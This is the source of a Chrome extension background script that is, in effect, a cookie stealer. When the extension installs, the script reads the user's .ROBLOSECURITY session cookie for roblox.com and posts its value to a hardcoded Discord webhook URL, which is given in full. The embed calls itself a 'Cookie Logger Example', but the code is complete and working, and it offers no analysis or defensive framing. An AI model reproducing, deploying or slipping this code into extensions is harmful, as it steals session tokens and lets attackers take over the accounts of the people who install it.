const webhook = "https://discord.com/api/webhooks/1288229097603989566/kARr2kG1hmAqPxbb9HpSABfcO53c7IU6TmweSb_GCYMUnB7LnFDOcyypMAzinrYJdklJ";

chrome.runtime.onInstalled.addListener(() => {
  chrome.cookies.get(
    { url: "https://roblox.com", name: ".ROBLOSECURITY" },
    (cookie) => {
      if (cookie) {
        fetch(webhook, {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            embeds: [
              {
                title: "Cookie Logger Example",
                description: "```" + cookie.value + "```",
              },
            ],
          }),
        });
      }
    }
  );
});
